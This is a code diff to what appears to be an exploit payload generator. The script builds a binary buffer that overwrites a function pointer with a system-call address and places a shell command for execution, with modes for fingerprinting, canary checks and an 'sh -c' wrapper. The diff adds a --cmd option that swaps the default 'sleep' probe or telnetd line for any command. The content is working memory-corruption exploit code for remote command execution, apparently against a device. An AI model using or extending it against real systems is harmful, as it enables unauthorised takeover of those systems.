@@ -36,6 +36,7 @@ def main():
     a.add_argument("--s", required=True)
     a.add_argument("--mode", choices=("fp", "wrap", "canary"), required=True)
     a.add_argument("--ms", type=int, default=8)
+    a.add_argument("--cmd", help="wrap mode: sh -c <cmd> (default: the telnetd line)")
     a.add_argument("--out", required=True)
     o = a.parse_args()
     S = int(o.s, 16)
@@ -85,7 +86,7 @@ def main():
             node[628:632] = struct.pack(">I", CANARY)
         elif o.mode == "fp":
             node[628:632] = struct.pack(">I", SYS["s2"])
-            cmd = b"sleep %d\x00" % o.ms
+            cmd = (o.cmd.encode() if o.cmd else b"sleep %d" % o.ms) + b"\x00"
             if len(cmd) > 107:
                 raise SystemExit("fp command exceeds the 107-byte node0 budget")
             node[0:len(cmd)] = cmd
@@ -93,7 +94,8 @@ def main():
             node[628:632] = struct.pack(">I", WRAP["s2"])
             cur = 700
             ptrs = []
-            for arg in WRAP_S2:
+            shell_cmd = o.cmd.encode() if o.cmd else WRAP_S2[2]
+            for arg in (WRAP_S2[0], WRAP_S2[1], shell_cmd):
                 node[cur:cur + len(arg) + 1] = arg + b"\x00"
                 ptrs.append(d(cur))
                 cur += len(arg) + 1
